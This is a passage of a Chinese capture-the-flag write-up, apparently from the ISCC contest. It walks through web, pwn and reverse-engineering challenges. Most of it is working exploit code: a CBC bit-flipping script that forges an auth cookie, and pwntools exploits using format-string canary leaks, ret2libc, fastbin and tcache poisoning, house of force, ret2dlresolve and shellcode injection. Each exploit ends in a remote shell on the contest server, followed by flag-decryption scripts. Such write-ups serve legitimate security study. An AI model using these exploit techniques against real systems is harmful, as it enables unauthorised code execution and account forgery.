'a:3:&#123;s:8:&quot;deppartm&quot;;s:5:&quot;sale1&quot;;s:8:&quot;username&quot;;s:3:&quot;enj&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;&#125;'\nc = base64.b64decode(&quot;ukOsB0IG9nfqN8S0eUuC92aBh7sbNoJDcVYCMccBQo+dpoPHI91BXCryxiHjBKtsD0/N3rY5+mIvuHK22WDDV/AsYHMH8FzgAXAIRiGj09YC0N/XUWV78++LH0ovuQB4&quot;)\nc0 = c[:16]\nm1 = b'tm&quot;;s:5:&quot;sale1&quot;;'\ntarget1 = b'tm&quot;;s:5:&quot;techn&quot;;'\n# c_是解密后未异或的值\nc_1 = strxor(m1,c0)\n# 伪造的第一个密文块\nfake_c0 = strxor(c_1,target1)\n\nnew_c = fake_c0 + c[16:]\nbase_new_c = base64.b64encode(new_c)\n\n# url = &quot;http://47.94.14.162:10014/normal.php&quot;\n# cookie = &#123;&quot;Auth_Key&quot;:urllib.parse.quote(&quot;WQ1eYrDvXCKueNoi7QHdPA==&quot;),&quot;Cyber_info&quot;:urllib.parse.quote(base_new_c),&quot;PHPSESSID&quot;:&quot;acak5gn1r8pc670ve0lrel2u8u&quot;&#125;\n# print(requests.get(url,cookies=cookie).text)\n\ncc = 'LwrtjHvppj+1L9wrF8Fz43RtIjtzOjU6InRlY2huIjtzOjg6InVzZXJuYW1lIjtzOjM6Im00eCI7czo4OiJwYXNzd29yZCI7czo2OiIxMjM0NTYiO30='\ncc0 = base64.b64decode(cc)[:16]\nm0 = b'a:3:&#123;s:8:&quot;deppar'\ncc_1 = strxor(real_iv,cc0)\nfake_iv = strxor(cc_1,m0)\n\nprint(base64.b64encode(fake_iv))\n\nurl = &quot;http://47.94.14.162:10014/normal.php&quot;\ncookie = &#123;&quot;Auth_Key&quot;:urllib.parse.quote(&quot;Fz2A1LB1wCUhdWJsirDPrQ==&quot;),&quot;Cyber_info&quot;:urllib.parse.quote(base_new_c),&quot;PHPSESSID&quot;:&quot;t4dod0sk4coouvcc4d0qa4f7nj&quot;&#125;\nprint(cookie)\nprint(requests.get(url,cookies=cookie).text)\n</code></pre>\n<p>发现 silly 是弱密码，登 silly</p>\n<p>运行上面那个脚本，对 cookie 进行替换</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242106391.png\" alt=\"image-20230524210434917\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242106639.png\" alt=\"image-20230524210445482\" /></p>\n<p>刷新即可成功混进去</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242106399.png\" alt=\"image-20230524210500029\" /></p>\n<p>现在我们进入技术部门了，直接任命我自己，连胜两级</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242106985.png\" alt=\"image-20230524210521269\" /></p>\n<p>一直升升到 100 多，然后再换一个号，用 enj 给这个号升级，升完以后再换过来，直到升到 10w</p>\n<p>成功读取 flag</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242106441.png\" alt=\"image-20230524210533166\" /></p>\n<h2 id=\"pwn\"><a class=\"anchor\" href=\"#pwn\">#</a> PWN</h2>\n<h3 id=\"三个愿望\"><a class=\"anchor\" href=\"#三个愿望\">#</a> 三个愿望</h3>\n<p>存在溢出和后门，格式化字符串泄露 canary，控制种子，预测随机数</p>\n<pre><code class=\"language-py\">from tools import *\nfrom ctypes import *\ncontext.log_level='debug'\np,e,libc=load('a','59.110.164.72:10001')\ne = cdll.LoadLibrary('libc.so.6')\nsystem=0x4011F5\npayload=b'\\x00'*0x16 \ne.srand(0)\np.sendafter('Now you can make your first wish',payload)\np.recvuntil('Please give me a number!')\npayload=str(e.rand() % 9 + 1)\np.sendline(payload)\npayload=b'%11$p'\np.sendafter('Now you can make your second wish!',payload)\na=p.recv(1)\ncanary=int(p.recv(18),16)\np.recvuntil('Please give me a number!')\npayload=str(2)\np.sendline(payload)\npayload=b'a'*0x28+p64(canary)+p64(system)*2\np.sendafter('Now you can make your final wish!',payload)\np.interactive()  \n</code></pre>\n<h3 id=\"login\"><a class=\"anchor\" href=\"#login\">#</a> Login</h3>\n<p>有溢出，有 libc 地址，直接打 ret2libc</p>\n<pre><code class=\"language-py\">from tools import *\ncontext.log_level='debug'\np,e,libc=load('Login','59.110.164.72:10000')\np.recvuntil('Here is a tip: ')\nlibc_base=int(p.recv(14),16)-0x3c48e0\nsystem=libc_base+0x453a0\nbin=libc_base+0x18ce57\npop_rdi=0x00000000004008c3\npayload=b'a'*28+p32(0x15CC15CC)\np.sendafter('input the username:',payload)\npayload=b'a'*0x28+p64(pop_rdi)+p64(bin)+p64(system)\np.sendafter('input the password:',payload)\np.interactive()  \n</code></pre>\n<h3 id=\"double\"><a class=\"anchor\" href=\"#double\">#</a> Double</h3>\n<p>刚开始以为是个菜单堆，不过发现程序给了后门，于是思路就是用 fastbin attack 让满足 if 的条件，通过检查后，因为存在栈溢出，打栈迁移执行 system (“/bin/sh”)</p>\n<pre><code class=\"language-py\">from tools import*\np,e,libc=load('double','59.110.164.72:10021')\ndef add(index,size):\n    p.sendlineafter('请选择：',str(1))\n    p.sendlineafter('请输入序号：',str(index))\n    p.sendlineafter('请输入大小',str(size))\ndef delete(index):\n    p.sendlineafter('请选择：',str(2))\n    p.sendlineafter('请输入序号：',str(index))\ndef show(index):\n    p.sendlineafter('请选择：',str(3))\n    p.sendlineafter('请输入序号：',str(index))\ndef edit(index,content):\n    p.sendlineafter('请选择：',str(4))\n    p.sendlineafter('请输入序号：',str(index))\n    p.sendlineafter('请输入编辑内容：',content)\nadd(0,0x400)\nadd(1,0x68)\ndelete(0)\n\nadd(2,0x400)\nshow(2)\nlibc_base=recv_libc()\n\nmalloc_hook=libc_base-0x10-88\nlog_addr('malloc_hook')\nlibc_base=libc_base-0x3c4b78\nlog_addr('libc_base')\nadd(3,0x68)\ndelete(3)\nadd(4,0x68)\ndelete(3)\nedit(4,p64(0x6021E0-8))\nadd(5,0x68)\nadd(6,0x68)\nedit(6,p64(0x15CC15CC)+b'a'*0x38+p64(0xCC51CC51))\np.sendlineafter('请选择：',str(5))\np.recvuntil('congratulations! Give you a reward:')\nstack=int(p.recv(15),16)\npayload=p64(0x0000000000400cb3)+p64(0x400CD8)+p64(0x4008FE)+b'a'*8+p64(stack-8)\np.recvuntil('please input what you want to say:')\np.sendline(payload)\np.interactive()\n</code></pre>\n<h3 id=\"困局\"><a class=\"anchor\" href=\"#困局\">#</a> 困局</h3>\n<p>格式化字符串泄露 canary，libc，栈地址。最后打 orw 绕过沙箱。</p>\n<pre><code class=\"language-py\">from tools import*\ncontext.log_level='debug'\np,e,libc=load('Trapped','59.110.164.72:10066')\np.sendlineafter('This is a larger box\\n',b'%9$p%15$p%p')\np.sendlineafter('We have a lot to talk about\\n',b'a'*0x10)\ncanary=int(p.recv(18),16)\nlog_addr('canary')\nlibc_base=int(p.recv(14),16)-0x20840\nlog_addr('libc_base')\nstack=int(p.recv(14),16)\nlog_addr('stack')\npop_rdi=libc_base+0x0000000000021112\npop_rsi=libc_base+0x00000000000202f8\npop_rdx=libc_base+0x0000000000001b92\nread=libc_base+0xf7350\nwrite=libc_base+0xf73b0\nopen=libc_base+0xf7130\ndebug(p,0x400804)\norw=p64(pop_rdi)+p64(stack+0xd0)+p64(pop_rsi)+p64(0)+p64(open)\norw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(stack-0x50)+p64(pop_rdx)+p64(0x50)+p64(read)\norw+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(stack-0x50)+p64(pop_rdx)+p64(0x50)+p64(write)+b'flag\\x00\\x00\\x00\\x00'\n\np.sendlineafter('This is a larger box\\n',b'%9$p%15$p')\np.sendlineafter('We have a lot to talk about\\n',b'a'*0x28+p64(canary)+p64(0xdeadbeef)+orw)\np.interactive() \n</code></pre>\n<h3 id=\"chef\"><a class=\"anchor\" href=\"#chef\">#</a> chef</h3>\n<p>简单题，存在堆溢出，直接打 fastbin attack 然后申请控制堆块，风水一下绕过 size 的检查，改指针为 got 表，用 show 函数泄露出 libc 地址，向 free_hook 写入 one_gadget</p>\n<pre><code class=\"language-py\">from tools import*\ncontext.log_level='debug'\np,e,libc=load('chef','59.110.164.72:10031')\np.sendlineafter('Your choice:',str(4))\ndef show():\n    p.sendlineafter('Your choice:',str(1))\ndef add(size,content):\n    p.sendlineafter('Your choice:',str(2))\n    p.sendlineafter('Please enter the price of food:',str(size))\n    p.sendafter('Please enter the name of food:',content)\ndef edit(index,size,content):\n    p.sendlineafter('Your choice:',str(3))\n    p.sendlineafter('Please enter the index of food',str(index))\n    p.sendlineafter('Please enter the price of food :',str(size))\n    p.sendlineafter('Please enter the name of food',content)\ndef delete(index):\n    p.sendlineafter('Your choice:',str(4))\n    p.sendlineafter('Please enter the index of food:',str(index))\nadd(0x68,b'trunk') #0\nadd(0x58,'a')  #1\nadd(0x58,'a')  #2\nadd(0x58,'a')  #3\ndelete(2)\ndelete(1)\nedit(0,0x78,b'a'*0x68+p64(0x61)+p64(0x6020a0-8))\nadd(0x58,'a') #4\nadd(0x58,p64(0x602018)) #5\nshow()\none=[0x45226,0x4527a,0xf03a4,0xf1247]\nlibc_base=recv_libc()-0x84540\nlog_addr('libc_base')\nmalloc_hook=libc_base+0x3c4b10\nfree_hook=libc_base+0x3c67a8\ndebug(p,add_p,delete_p,show_p,edit_p)\nedit(2,0x78,p64(free_hook))\nedit(0,0x78,p64(one[1]+libc_base))\ndelete(3)\np.interactive() \n</code></pre>\n<h3 id=\"谜语人\"><a class=\"anchor\" href=\"#谜语人\">#</a> 谜语人</h3>\n<p>libc 给的不对，需要泄露出地址用 libcsearcher 来搜。</p>\n<p>逆向分析后发现是菜单堆，只能申请 0x30 的堆块，存在一个 UAF 漏洞，因为缓冲区没有设置好，可以直接打 tcache bin attack 劫持到缓冲区的堆块上，然后申请出来再释放即可泄露出来 libc 地址。用 Libcsearcher 搜一下，然后打 tcache bin attack 劫持 free_hook</p>\n<pre><code class=\"language-py\">from tools import *\ncontext.log_level='debug'\n\np,e,libc=load(&quot;Riddler.bk&quot;,&quot;59.110.164.72:10086&quot;)\n\ndef add(index):\n    p.sendlineafter(&quot;Then?\\n&quot;,str(2))\n    p.sendlineafter(&quot;emmm?!\\n&quot;,str(index))\n\ndef edit(index,content):\n    p.sendlineafter(&quot;Then?\\n&quot;,str(3))\n    p.sendlineafter(&quot;emmm?!\\n&quot;,str(index))\n    #pause()\n    p.sendline(content)\n\n\ndef show(index):\n    p.sendlineafter(&quot;Then?\\n&quot;,str(0))\n    p.sendlineafter(&quot;emmm?!\\n&quot;,str(index))\n\n\ndef delete(index):\n    p.sendlineafter(&quot;Then?\\n&quot;,str(1))\n    p.sendlineafter(&quot;emmm?!\\n&quot;,str(index))\nadd(4)\nadd(5)\nadd(6)\ndelete(5)\ndelete(6)\nshow(6)\nheap_addr=u32(p.recv(4))\nlog_addr('heap_addr')\nedit(6,p32(heap_addr-0x1040))\nadd(7)\nadd(8)\ndelete(8)\nshow(8)\np.recv(4)\nleak_libc=u32(p.recv(4))-56-0x18#-0x1d87d8\n# obj = LibcSearcher('__malloc_hook', leak_libc)\nlibc_base = leak_libc - 0x1d5788#obj.dump('__malloc_hook')\nsys_addr = libc_base + 0x03cf10#obj.dump('system')\nfree_hook=libc_base+0x001d68d0#obj.dump('__free_hook')\nlog_addr('libc_base')\ndelete(7)\ndelete(4)\nedit(4,p32(free_hook))\nadd(9)\nedit(9,'/bin/sh\\x00')\nadd(0x3)\nedit(0x3,p32(sys_addr))\ndelete(0x9)\np.interactive()\n</code></pre>\n<h3 id=\"eat_num\"><a class=\"anchor\" href=\"#eat_num\">#</a> eat_num</h3>\n<p>原题，打 ret2dl 即可。因为是原题直接用模板打就行</p>\n<pre><code class=\"language-py\">from tools import*\np,e,libc=load('38','59.110.164.72:10067')\noffset=0x4c\nplt0 = e.get_section_by_name('.plt').header.sh_addr\nrel_plt = e.get_section_by_name('.rel.plt').header.sh_addr\ndynsym = e.get_section_by_name('.dynsym').header.sh_addr\ndynstr = e.get_section_by_name('.dynstr').header.sh_addr\nread_plt_addr=e.plt['read']\nfour_pop_ret=0x80484A8  #***\nleave_ret_addr=0x8048428  #***\nbase_addr=0x0804a800\nfake_sym_addr=base_addr+32\nalign=0x10-((fake_sym_addr-dynsym)&amp;0xf)\nfake_sym_addr+=align\nst_name=fake_sym_addr+0x10-dynstr\nst_info=12\nfake_sym=p32(st_name)+p32(0)+p32(0)+p32(st_info)\nr_offset=e.got['read']\nr_sym=(fake_sym_addr-dynsym)/0x10\nr_type=0x7\nr_info=(int(r_sym)&lt;&lt;8)+(r_type&amp;0xf)\nreloc_index=base_addr-rel_plt+24\nfake_rel_plt=p32(r_offset)+p32(r_info)\npayload1=offset*b'a'+p32(read_plt_addr)+p32(four_pop_ret)+p32(0)+p32(base_addr)+p32(100)+p32(base_addr-4)+p32(leave_ret_addr)\np.send(payload1)\npause()\npayload2=p32(plt0)+p32(reloc_index)\npayload2+=b'bbbb'\npayload2+=p32(base_addr+80)\npayload2+=b'bbbb'\npayload2+=b'bbbb'\npayload2+=fake_rel_plt\npayload2+=align*b'a'\npayload2+=fake_sym\npayload2+=b'system\\x00'\npayload2+=(80-len(payload2))*b'a'\npayload2+=b'/bin/sh\\x00'\npayload2+=(100-len(payload2))*b'a'\np.send(payload2)\np.interactive()\n</code></pre>\n<h3 id=\"第二识势\"><a class=\"anchor\" href=\"#第二识势\">#</a> 第二识势</h3>\n<p>先打 house of force，把 data 段的内存给申请出来，向里面写入 0x10 个字符 a 来绕过 if 的检查。因为啥保护都没开，直接打 ret2shellcode 即可，如果不打 house of force 的话，默认的检查是过不去的</p>\n<pre><code class=\"language-py\">from tools import *\np,elf,libc=load(&quot;last&quot;,&quot;59.110.164.72:10025&quot;)\np.sendafter(&quot;Start injecting\\n&quot;,b&quot;\\x00&quot;+b&quot;y&quot;*23)\np.recvline()\nheap_addr=int(p.recv(9)[:-1])\nlog_addr(&quot;heap_addr&quot;)\npause()      \np.send(str(-1)) \npause()\nrequest_size=0x6012a0-0x20-(heap_addr-8)\np.send(str(request_size))\npayload=b&quot;a&quot;*0x10\np.sendafter(b&quot;Answer time is close to over\\n&quot;,payload)\nleave_ret=0x0000000000400944\nrbp=0x00000601328\nshellcode=0x601338\npayload=b&quot;a&quot;*0x80\npayload+=p64(rbp)+p64(leave_ret)+p64(shellcode)\npayload+=b&quot;\\x48\\xC7\\xC0\\x3B\\x00\\x00\\x00\\x49\\xB8\\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68\\x00\\x41\\x50\\x48\\x31\\xF6\\x48\\x31\\xD2\\x54\\x5F\\x0F\\x05&quot;\np.sendafter(&quot;Direct to destination\\n&quot;,payload)\np.interactive()\n</code></pre>\n<h3 id=\"第一用笔\"><a class=\"anchor\" href=\"#第一用笔\">#</a> 第一用笔</h3>\n<p>存在溢出，控制 rbp 第二次调用 read 任意写，打 one_gadget 拿 shell</p>\n<pre><code class=\"language-py\">from tools import *\ncontext.log_level=&quot;debug&quot;\np=remote(&quot;59.110.164.72&quot;,10002)\npop_rdi=0x0000000000400c53\nputs_plt=0x4006F0\nputs_got=0x602020\npayload=b'dunbi000'\npayload+=b'cuobi000'\npayload+=b'yufeng00'\npayload+=b'dunfeng0'\npayload+=b'cunfeng0'\npayload+=b'nvfeng00'\npayload+=b'yuefeng0'\npayload+=b'anfeng00'\npayload+=b'jiebi000'\np.sendlineafter(&quot;and 40 to 47 is 'nvfeng00'!\\n&quot;,payload)\ndebug(p)\npayload=b'a'*0x28+p64(0x400B0F)\np.sendafter(&quot;or you can look for other space\\n&quot;,payload)\npayload=b'a'*0x28+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(0x400B0F)\npause()\np.send(payload)\nlibc_base=u64(p.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00'))-0x6f6a0\nlog_addr(&quot;libc_base&quot;)\nog=[0x45226,0x4527a,0xf03a4,0xf1247]\npayload=b'a'*0x28+p64(og[1]+libc_base)\npause()\np.send(payload)\np.interactive()\n</code></pre>\n<h3 id=\"sims\"><a class=\"anchor\" href=\"#sims\">#</a> SIMS</h3>\n<p>2.27 因为有 uaf 和 edit 功能，直接打 tcache poisoning</p>\n<pre><code class=\"language-py\">from tools import *\ncontext.log_level='debug'\n\ndef add(size):\n    p.sendlineafter(&quot;please choose one!\\n&quot;,str(1))\n    p.sendlineafter(&quot;Age of Stu:\\n&quot;,str(size))\n    \ndef show(index):\n    p.sendlineafter(&quot;please choose one!\\n&quot;,str(4))\n    p.sendlineafter(&quot;Index:\\n&quot;,str(index))\n\ndef edit(index,content):\n    p.sendlineafter(&quot;please choose one!\\n&quot;,str(3))\n    p.sendlineafter(&quot;Index:\\n&quot;,str(index))\n    p.sendafter(&quot;Content of Stu:\\n&quot;,content)\n\ndef delete(index):\n    p.sendlineafter(&quot;please choose one!\\n&quot;,str(2))\n    p.sendlineafter(&quot;Index:\\n&quot;,str(index))\np,e,libc=load(&quot;SIMS&quot;,&quot;59.110.164.72:10085&quot;)\nkey=1804289383^365696460\np.sendlineafter(&quot;welcome~ please input the password:\\n&quot;,str(key))\nadd(0x500)\nadd(0x40)\nadd(0x40)\ndelete(0)\ndelete(1)\ndelete(2)\nshow(0)\nlibc_base=recv_libc()-0x3ebca0\nsys_addr=libc_base+libc.symbols['system']\nfree_hook=libc_base+libc.symbols['__free_hook']\nedit(2,p64(free_hook))\nadd(0x40)\nadd(0x40)\nedit(2,'/bin/sh\\x00')\nedit(1,p64(sys_addr))\ndelete(2)\np.interactive()\n</code></pre>\n<h3 id=\"your_character\"><a class=\"anchor\" href=\"#your_character\">#</a> Your_character</h3>\n<p>2.23 的 libc，发现是个菜单堆，漏洞是 off by one，释放堆块进入 unsorted bin，执行 show 函数可以得到 unsorted bin 的 fd 指针，也就是 main_arena+88，也就是 libc 地址。然后再改 size 中的 prev inuse 位，触发堆块合并，造成堆块重叠，然后把 free_hook 申请出来写入 one_gadget</p>\n<pre><code class=\"language-py\">from tools import*\np,e,libc=load('4','59.110.164.72:10003')\np.sendlineafter('Your choice :',str(1))\ndef add(size,content='/bin/sh\\x00'):\n    p.sendlineafter('Your choice :',str(1))\n    p.sendlineafter('Damage of skill :',str(size))\n    p.sendafter('introduction of skill:',content)\ndef edit(index,size):\n    p.sendlineafter('Your choice :',str(2))\n    p.sendlineafter( 'Index :',str(index))\n    p.sendafter('Damage of skill :',str(size))\ndef edit2(index,content='/bin/sh\\x00'):\n    p.sendlineafter('Your choice :',str(3))\n    p.sendlineafter( 'Index :',str(index))\n    p.sendafter('introduction of skill :',content)\ndef show(index):\n    p.sendlineafter('Your choice :',str(4))\n    p.sendlineafter( 'Index :',str(index))\ndef delete(index):\n    p.sendlineafter('Your choice :',str(5))\n    p.sendlineafter( 'Index :',str(index))\n\nadd(0x478,b'1'*0x28)\nadd(0x28,b'2'*0x28)\nedit(0,0x488)\nadd(0x28,b'aaaaaaaa')\nshow(2)\np.recvuntil('aaaaaaaa')\nlibc_base=u64(p.recv(6).ljust(8,b'\\x00'))-0x3c4b78\nlog_addr('libc_base')\nmalloc_hook=libc_base+0x3c4b10\nfree=libc_base+0x3c67a8\nog=[0x45226,0x4527a,0xf03a4,0xf1247]\nedit2(0,b'a'*0x430+p64(0x440))\ndelete(1)\ndelete(0)\ndelete(2)\nadd(0x38)\nedit(0,0x38)\nadd(0x38)\nedit(1,0x38)\nadd(0x38)\nedit(2,0x38)\nadd(0x38,'cccccccc')\nedit(3,0x48)\nedit2(0,b'b'*0x38+b'\\x61')\ndelete(1)\nadd(0x58,b'dddddddd'*7+p64(0x50)*2+p64(free))\nedit(1,0x58)\nedit2(2,p64(og[1]+libc_base))\ndelete(0)\np.interactive()\n</code></pre>\n<h2 id=\"reverse\"><a class=\"anchor\" href=\"#reverse\">#</a> Reverse</h2>\n<h3 id=\"justdoit\"><a class=\"anchor\" href=\"#justdoit\">#</a> JustDoIt</h3>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242208224.gif\" alt=\"img\" /></p>\n<p>只有一个加密函数，在第 36 行的 sub_487C91</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242208223.gif\" alt=\"img\" /></p>\n<p>简单的加密函数，是一些常规的字符串变换，有四个 for 循环加密</p>\n<p>只有最后一个 for 循环需要注意，使用了 “ISCC” 来加密</p>\n<p>脚本</p>\n<pre><code class=\"language-c\">#include &lt;stdio.h&gt;\nint main() &#123;\n    char a1[15]=&#123;23,68,68,15,94,10,8,10,6,95,8,24,87,3,26&#125;;\n  \tchar a2[5]=&quot;ISCC&quot;;\n    int a3 = 15;\n\n    for (int m = 1; m &lt; a3; ++m) &#123;\n        a1[m] ^= a2[0];\n        a1[m] -= a2[m % 4] % 5;\n        a1[m] += a2[2] % 6 + a2[3] / 6;\n        a1[m] -= a2[1] / 7 + a2[0] % 7;\n    &#125;\n    for (int k = 1; k &lt; a3; ++k) &#123;\n        a1[k] -= k;\n    &#125;\n    int v4 = a1[a3 - 1];\n    for (int j = a3 - 1; j &gt; 0; --j) &#123;\n        a1[j] = a1[j - 1];\n    &#125;\n    for (int i = 0; i &lt; a3; ++i) &#123;\n        a1[i] += 60;\n    &#125;\n    for (int i = 1; i &lt;15; ++i) &#123;\n\t\tif(i==15)\n\t\t&#123;\n\t\t\tprintf(&quot;%c&quot;,a1[0]);\n\t\treturn 0;\n\t\t&#125;\n\t\tprintf(&quot;%c&quot;, a1[i]); \n    &#125;\n&#125;\n</code></pre>\n<p>得到 flag：ISCC {Just<sub>Do</sub>It}</p>\n<h3 id=\"奇门遁甲\"><a class=\"anchor\" href=\"#奇门遁甲\">#</a> 奇门遁甲</h3>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242220688.gif\" alt=\"img\" /></p>\n<p>逻辑是需要按照 v3 自增的顺序选择输入，v3 是从 1 加到 8，我们需要让 case 选择 v3 自增的顺序，也就是 3 1 2 8 4 5 6 7</p>\n<p>每次输入都会有 flag 碎片，拼起来就能得到 flag</p>\n<p xx9nGK&amp;2tQrDV6WcoxSGRGAX=\"\">Flag：ISCC</p>\n<h3 id=\"congratulations\"><a class=\"anchor\" href=\"#congratulations\">#</a> Congratulations</h3>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242210828.gif\" alt=\"img\" /></p>\n<p>第 41 行一眼顶针，鉴定为假 flag，所以不管</p>\n<p>真正的输入在 44 行，接着经过了两个加密函数</p>\n<p>第一个加密</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242210829.gif\" alt=\"img\" /></p>\n<p>凯撒加密，传入的 - 1 是移动的位数，所以字符串在字母表中的位置整体向左移一位</p>\n<p>第二个加密</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242210836.gif\" alt=\"img\" /></p>\n<p>是自定义加密，有三段 for 循环，代表三段加密</p>\n<p>第一段所有字符串减 30,</p>\n<p>第二段将字符串的前一位减去后一位</p>\n<p>第三段将所有字符串异或 “S”</p>\n<p>逻辑清晰，接下来写脚本</p>\n<pre><code class=\"language-c\">#include&lt;stdio.h&gt;\nvoid re(char *a1, char *a2, int a3) &#123;\n\tint k,j,i,p;\n    for (k = a3 - 2; k &gt;= 0; --k) &#123;\n        a1[k] ^= *(a2 + 1);\n    &#125;\n    for (j = a3 - 2; j &gt;= 0; --j) &#123;\n        a1[j] += a1[j+1];\n    &#125;\n    for (p = a3 - 1; p &gt;= 0; --p) &#123;\n        a1[p] += 30;\n    &#125;\n    \n  char v4[36]=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;\n  char v5[32]=&quot;abcdefghijklmnopqrstuvwxyz&quot;;\n\n  for ( i = 0; ; ++i )\n  &#123;\n    if ( !*(i + a1) )\n      break;\n    if ( *(i + a1) &lt; 97 || *(i + a1) &gt; 122 )\n    &#123;\n      if ( *(i + a1) &gt;= 65 &amp;&amp; *(i + a1) &lt;= 90 )\n        *(i + a1) = v4[(*(i + a1) - 65 + 1) % 26];\n    &#125;\n    else\n    &#123;\n      *(i + a1) = v5[(*(i + a1) - 97 + 1) % 26];\n    &#125;\n  &#125;\n&#125;\n\n\nint main()\n&#123;\n\tchar v9[26];\n v9[0] = -91;\n  v9[1] = 67;\n  v9[2] = 83;\n  v9[3] = -108;\n  v9[4] = 126;\n  v9[5] = 89;\n  v9[6] = -76;\n  v9[7] = 107;\n  v9[8] = -92;\n  v9[9] = -26;\n  v9[10] = 101;\n  v9[11] = 80;\n  v9[12] = -113;\n  v9[13] = 116;\n  v9[14] = -70;\n  v9[15] = -65;\n  v9[16] = -67;\n  v9[17] = 17;\n  v9[18] = -90;\n  v9[19] = -100;\n  v9[20] = 28;\n  v9[21] = -79;\n  v9[22] = -79;\n  v9[23] = 19;\n  v9[24] = -9;\n  v9[25] = 95;\n  \tchar v6[]=&quot;ISCC&quot;;\n  \tint v8=26;\n\tre(v9,v6,v8);\n\tint i;\n\t for (i = 0; i &lt; 26; i++) &#123;\n\n        printf(&quot;%c&quot;, v9[i]);\n    &#125;\n\treturn 0;\n &#125; \n</code></pre>\n<p OE]%.zD@e=\"Uia8Du%Db!\">输出为：ISCC</p>\n<h3 id=\"变形记\"><a class=\"anchor\" href=\"#变形记\">#</a> 变形记</h3>\n<p>说实话这道题代码分析还挺困难的，无用代码很多，最后还是沉下心慢慢分析才有了头绪。因为代码很长，就只分析关键代码</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242213833.gif\" alt=\"img\" /></p>\n<p>图示代码实现了遍历输入寻找相邻的相同字符，如果相同，则记录，最后将相同字符转换为相同字符的个数，替换原来的字符串</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242213833.gif\" alt=\"img\" /></p>\n<p>这里有个 base 码，本来以为对 base 码也有加密，但是看到字符串开头有两个等号，就先猜是不是把编码倒过来解密就可以了，结果正确</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242213839.gif\" alt=\"img\" /></p>\n<p>所以脚本如下</p>\n<pre><code class=\"language-python\">import base64\n\ndef reverse_string(string):\n    return string[::-1]\ndef base64_decode(string):\n    return base64.b64decode(string).decode('utf-8')\n\nuser_input = input(&quot;输入：&quot;)\n\nreversed_string = reverse_string(user_input)\nprint(&quot;逆序：&quot;, reversed_string)\n\ndecoded_string = base64_decode(reversed_string)\nprint(decoded_string)\n\n</code></pre>\n<pre><code>得到y3QvyUyQsVszsyv2ays，对其进行变换\n得到flag：ISCC&#123;yyyQvyUyQsVszsyvvays&#125;\n</code></pre>\n<h3 id=\"convert\"><a class=\"anchor\" href=\"#convert\">#</a> Convert</h3>\n<p>这道题只需要理清字符串变换的逻辑就行了</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242219547.gif\" alt=\"img\" /></p>\n<p>可以看到这道题只有一个加密函数 sub_488B0A</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242219550.gif\" alt=\"img\" /></p>\n<p>这里的加密逻辑也很简单，首先让字符串遍历减去 32 在加上遍历值</p>\n<p>接着是一个自定义加密，将 “ISCC” 作为密钥传入，这里写脚本需要倒着写，因为第 21 行的加密使用的是第 19 行加密的数据，所以解密需要加密的数据</p>\n<p>脚本如下</p>\n<pre><code class=\"language-c\">#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nvoid re(char *a1, char *a2, int a3) &#123;\n    int i, j;\n    for (j = 3; j &gt;=0 ; j--) &#123;\n        *(a1 + j + 16) -= (*(a2 + j))/ 5;\n        *(a1 + j + 12) -= *(a1 + j + 4);\n        *(a1 + j + 8) -= 2 * j;\n        *(a1 + j + 4) -= *(a2 + j) % 5;\n        *(a1 + j) -= j ^ -(*(a2 + j) % 4);\n    &#125;\n        for (i = 0; i &lt;=a3-1; i++) &#123;\n        *(a1 + i) -= i;\n        *(a1 + i) += 32;\n    &#125;\n&#125;\n\nint main() &#123;\n Char\ta1[]= &#123;0x28,0x30,0x24,0x24,0x62,0x2E,0x1A,0x0A,0x1C,0x48,0x2E,0x3A,0x93,0x5B,0x48,0x50,0x3E,0x42,0x2A,0x36,0x3B,0x28,0x73&#125;;\n    char a2[] = &quot;ISCC&quot;;\n    int a3 = 23;\n    int i;\n    re(a1, a2, a3);\n    for (i = 0; i &lt; 23; i++) &#123;\n\n        printf(&quot;%c&quot;, a1[i]);\n    &#125;\n    return 0;\n&#125;\n</code></pre>\n<h3 id=\"pull-the-wool-over-peoples-eyes\"><a class=\"anchor\" href=\"#pull-the-wool-over-peoples-eyes\">#</a> Pull the Wool Over People's Eyes</h3>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242221641.gif\" alt=\"img\" /></p>\n<p>程序使用 Src 当密钥与输入进行异或，Src 的获取与 44 行函数有关，进入函数</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242221643.gif\" alt=\"img\" /></p>\n<p>可以发现密钥，但是注意 v18 经过了一次冒泡排序变换，所以我们需要先获取冒泡排序后的输出</p>\n<pre><code class=\"language-python\">def bubble_sort(string):\n    n = len(string)\n    # 将字符串转换为字符数组\n    arr = list(string)\n\n    # 冒泡排序\n    for i in range(n - 1):\n        for j in range(n - i - 1):\n            if ord(arr[j]) 